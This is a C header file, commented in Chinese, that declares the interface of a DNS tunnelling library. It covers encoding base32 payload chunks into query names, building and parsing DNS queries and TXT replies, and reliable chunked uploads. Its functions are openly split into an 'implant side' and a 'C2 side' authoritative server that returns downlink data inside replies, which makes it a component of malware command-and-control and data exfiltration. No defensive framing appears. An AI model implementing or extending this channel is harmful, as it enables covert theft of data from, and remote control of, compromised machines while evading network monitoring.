#ifndef TX_DNSTUN_H
#define TX_DNSTUN_H

#include <stddef.h>
#include <stdint.h>

/* 每片上行净荷上限。base32 后 160 字符，切成 3 个 <=63 的标签，
   连同 seq/ack/fin/session/domain 总长仍在 253 以内。 */
#define TX_DNSTUN_CHUNK     100
#define TX_DNSTUN_MAXNAME   253
#define TX_DNSTUN_MAXTXT    200

typedef enum {
    TX_DNSTUN_OK        =  0,
    TX_DNSTUN_ERR_ARGS  = -1,
    TX_DNSTUN_ERR_SOCK  = -2,
    TX_DNSTUN_ERR_TIMEOUT = -3,
    TX_DNSTUN_ERR_RETRY = -4,
    TX_DNSTUN_ERR_PROTO = -5,
    TX_DNSTUN_ERR_TOOBIG= -6,
} tx_dnstun_err_t;

const char *tx_dnstun_errstr(int e);

/* ---- QNAME 编解码 ----
   格式: <seq8hex>.<ack8hex>.<fin>.<b32标签...>.<session>.<domain>
   中间若干个 <=63 的标签拼接后 base32 解码即净荷。 */
int tx_dnstun_label_build(uint32_t seq, uint32_t ack, int fin,
                          const uint8_t *chunk, size_t clen,
                          const char *session, const char *domain,
                          char *out, size_t cap);

int tx_dnstun_label_parse(const char *name, uint32_t *seq, uint32_t *ack,
                          int *fin, uint8_t *chunk, size_t cap, size_t *clen);

/* ---- RFC 1035 报文编解码 ---- */
size_t tx_dns_build_query(const char *qname, uint16_t tid, uint8_t *out, size_t cap);
int    tx_dns_parse_query(const uint8_t *p, size_t len, char *qname, size_t cap, uint16_t *tid);
size_t tx_dns_build_txt_reply(const uint8_t *q, size_t qlen,
                              const uint8_t *txt, size_t tlen,
                              uint8_t *out, size_t cap);
int    tx_dns_parse_txt(const uint8_t *p, size_t len,
                        uint8_t *out, size_t cap, size_t *olen);

/* ---- 隧道端点（implant 侧） ---- */
typedef struct tx_dnstun tx_dnstun_t;

int  tx_dnstun_open(tx_dnstun_t **out, const char *resolver_ip, int port,
                    const char *domain, const char *session,
                    int timeout_ms, int max_retry);
void tx_dnstun_close(tx_dnstun_t *t);

/* 可靠上行：分片 -> 逐片停等 ARQ -> 超时重传。成功返回 0，*acked 为已确认字节数 */
int  tx_dnstun_send(tx_dnstun_t *t, const uint8_t *data, size_t len, size_t *acked);

/* 取回下行数据（由权威端随 ACK 捎带） */
int  tx_dnstun_poll(tx_dnstun_t *t, uint8_t *out, size_t cap, size_t *olen);

/* 单轮交互（不重传），用于探测/心跳 */
int  tx_dnstun_exchange(tx_dnstun_t *t, const uint8_t *up, size_t uplen,
                        uint8_t *down, size_t cap, size_t *downlen);

/* ---- 权威端（C2 侧） ---- */
/* 回调返回 0 表示接受该片；*downlen 为要捎带回去的下行字节数 */
typedef int (*tx_dnsauth_cb)(uint32_t seq, int fin,
                             const uint8_t *chunk, size_t clen,
                             uint8_t *down, size_t cap, size_t *downlen,
                             void *arg);

int tx_dnsauth_listen(int port, int *out_port);
int tx_dnsauth_serve_once(int sock, tx_dnsauth_cb cb, void *arg, int timeout_ms);

#endif
